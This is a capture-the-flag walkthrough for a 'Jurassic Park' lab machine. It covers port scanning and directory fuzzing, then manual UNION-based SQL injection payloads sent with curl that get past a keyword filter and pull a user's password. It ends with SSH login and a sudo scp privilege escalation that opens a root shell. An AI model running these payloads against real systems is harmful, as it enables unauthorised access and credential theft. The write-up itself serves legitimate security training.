# Jurassic Park - Hard

* After mapping ```jurassic.thm``` to given IP, do a nmap scan - ```nmap -T4 -p- -A -Pn -v jurassic.thm```:

  * 22/tcp - ssh - OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
  * 80/tcp - http - Apache httpd 2.4.18 ((Ubuntu))

* The page at port 80 for 'Jarassic Park' links to a shop page at '/shop.php'

* We have a '/robots.txt', but it just says 'Wubbalubbadubdub'

* We also have a lot of files under '/assets' that can be checked; while we do that we can do initial directory scanning:

  ```sh
  gobuster dir -u http://jurassic.thm -w /usr/share/wordlists/dirb/big.txt -x txt,php,html,bak -t 25
  ```

* The files under '/assets' seem to include a few clips and images, but nothing that gives a hint

* At '/shop.php', we have 3 packages and clicking on each of them leads to '/item.php' with the ID parameter - for example, ```http://jurassic.thm/item.php?id=2```. We can do some fuzzing here:

  ```sh
  # create a list of numbers from 0-9999 to start with
  for num in {0..10000};do echo $num >> numbers.txt;done

  # we can fuzz the value of the id parameter with numbers first
  ffuf -w numbers.txt -u "http://jurassic.thm/item.php?id=FUZZ"

  # filter out false positives
  ffuf -w numbers.txt -u "http://jurassic.thm/item.php?id=FUZZ" -fs 81
  ```

* From the directory scanning, we get a few interesting pages - '/delete' and '/requests.txt'

* '/delete' gives a hint about MySQL password and Ubuntu, but this is not useful right now for getting the initial foothold. '/requests.txt' just says 0

* On fuzzing with numbers for the 'id' parameter, we get two additional pages -

  * ```http://jurassic.thm/item.php?id=5``` - this page mentions the string ```' # DROP - username @ ----``` - this could be a clue for SQLi
  * ```http://jurassic.thm/item.php?id=100``` - this page does not include any clue

* As we have been given a SQLi clue, we can continue fuzzing with similar wordlists:

  ```sh
  ffuf -w /usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt -u "http://jurassic.thm/item.php?id=FUZZ" -fs 81

  # filtering out more false positives
  ffuf -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt -u "http://jurassic.thm/item.php?id=FUZZ" -fs 81,1944

  ffuf -w /usr/share/seclists/Fuzzing/SQLi/Generic-BlindSQLi.fuzzdb.txt -u "http://jurassic.thm/item.php?id=FUZZ" -fs 81,1944
  ```

* On multiple SQLi attempts, we get a GIF with the messages "access: permission denied" and "you didn't say the magic word!"; the page also mentions ```sqlmap``` at the end

* For some payloads such as ```&``` and ```admin"/*```, we get SQL errors included in the page; furthermore, payloads like ```(sqlvuln)``` and ```truncate``` indicate a ```WHERE``` clause is being used

* We can also try ```sqlmap``` since it is mentioned in the page:

  ```sh
  sqlmap -u 'http://jurassic.thm/item.php?id=1' --batch --dump --risk=3 --level=5
  # this gives us "reflective value(s) found and filtering out" message
  # we need to use some more filters

  sqlmap -u 'http://jurassic.thm/item.php?id=1' -p id --batch --dump --risk=3 --level=5 --not-string="You have an error" --not-string="MAGIC WORD"
  # this also does not work
  ```

* ```sqlmap``` does not work as expected due to WAF likely; from the previous checks, as the characters ```' # DROP - username @ ----``` are blocked, we cannot use them in our payloads. We can take a manual approach:

  ```sh
  curl 'http://jurassic.thm/item.php?id="'
  # using double quote, we get SQL syntax error
  # we can build our payload on this

  curl 'http://jurassic.thm/item.php?id=1"'

  curl 'http://jurassic.thm/item.php?id=-1"'
  # gives usual error

  curl 'http://jurassic.thm/item.php?id=1\"'

  curl 'http://jurassic.thm/item.php?id=1%20and%200'
  # URL encoded payload '1 and 0"'
  # this gives a different error message - 'No results found...'

  # since hyphens cannot be used, we can try to use double-quotes again
  # and add another payload

  curl 'http://jurassic.thm/item.php?id="%20OR%201=1"%20OR%201=1'
  # this prints the '/item.php' page itself, instead of the error
  # indicating we can build on this payload further

  # we need to find the number of columns first

  curl 'http://jurassic.thm/item.php?id="%20OR%201=1"%20UNION%20SELECT%201'
  # prints error message
  # The used SELECT statements have a different number of columns

  curl 'http://jurassic.thm/item.php?id="%20OR%201=1"%20UNION%20SELECT%201,2'
  # keep increasing the numbers

  curl 'http://jurassic.thm/item.php?id="%20OR%201=1"%20UNION%20SELECT%201,2,3,4,5'
  # this gives '/item.php'
  # so we know the table has 5 columns

  # we need to find more info about the DB and the table
  # we can start by checking information_schema table

  # payload - " OR 1=1" UNION SELECT 1,2,3,table_schema,table_name FROM INFORMATION_SCHEMA.tables
  curl 'http://jurassic.thm/item.php?id=%22%20OR%201=1%22%20UNION%20SELECT%201,2,3,table_schema,table_name%20FROM%20INFORMATION_SCHEMA.tables'
  # this mentions 'x$waits_global_by_latency' as table_name and 'sys' as table_schema

  # to identify version
  # payload - " OR 1=1" UNION SELECT 1,2,3,version(),table_name FROM INFORMATION_SCHEMA.tables
  curl 'http://jurassic.thm/item.php?id=%22%20OR%201=1%22%20UNION%20SELECT%201,2,3,version(),table_name%20FROM%20INFORMATION_SCHEMA.tables'
  # we get the version 'ubuntu16.04'

  # to identify database
  # payload - " OR 1=1" UNION SELECT 1,2,3,database(),table_name FROM INFORMATION_SCHEMA.tables
  curl 'http://jurassic.thm/item.php?id=%22%20OR%201=1%22%20UNION%20SELECT%201,2,3,database(),table_name%20FROM%20INFORMATION_SCHEMA.tables'
  # shows DB 'park'

  # to identify tables
  # payload - " OR 1=1" UNION SELECT 1,2,3,database(),table_name FROM INFORMATION_SCHEMA.tables WHERE table_schema=database()
  curl 'http://jurassic.thm/item.php?id=%22%20OR%201=1%22%20UNION%20SELECT%201,2,3,database(),table_name%20FROM%20INFORMATION_SCHEMA.tables%20WHERE%20table_schema=database()'
  # this gives table name 'users'

  # to identify columns
  # payload - " OR 1=1" UNION SELECT 1,2,3,column_name,table_name FROM INFORMATION_SCHEMA.columns WHERE table_schema=database() and table_name="users"
  curl 'http://jurassic.thm/item.php?id=%22%20OR%201=1%22%20UNION%20SELECT%201,2,3,column_name,table_name%20FROM%20INFORMATION_SCHEMA.columns%20WHERE%20table_schema=database()%20and%20table_name=%22users%22'
  # this gives column name 'password'

  # to get 'password' data
  # payload - " OR 1=1" UNION SELECT 1,2,3,password,5 FROM users
  curl 'http://jurassic.thm/item.php?id=%22%20OR%201=1%22%20UNION%20SELECT%201,2,3,password,5%20FROM%20users'
  # this gives password 'ih8dinos'
  ```

* Now, according to given context, we have Dennis as user. So we can attempt SSH login using the password found from SQLi:

  ```sh
  ssh dennis@jurassic.thm
  # we are able to SSH

  pwd
  # /home/dennis

  ls
  # get flag1

  cat test.sh
  # we have a script that prints flag5 from /root
  # but this would not work because we do not have the permission

  less .bash_history
  # this gives us flag3
  # also mentions 'sudo -l', 'scp' and transferring flag5 to other machines in the network

  sudo -l
  # we can run /usr/bin/scp as root

  less .viminfo
  # this mentions flag2 and flag4

  cat /boot/grub/fonts/flagTwo.txt
  # flag2

  # now we can try the exploit from GTFObins for scp
  
  TF=$(mktemp)

  echo 'sh 0<&2 1>&2' > $TF

  chmod +x "$TF"
  
  sudo /usr/bin/scp -S $TF x y:
  # this gives us root shell
  # get flag5 from /root
  ```
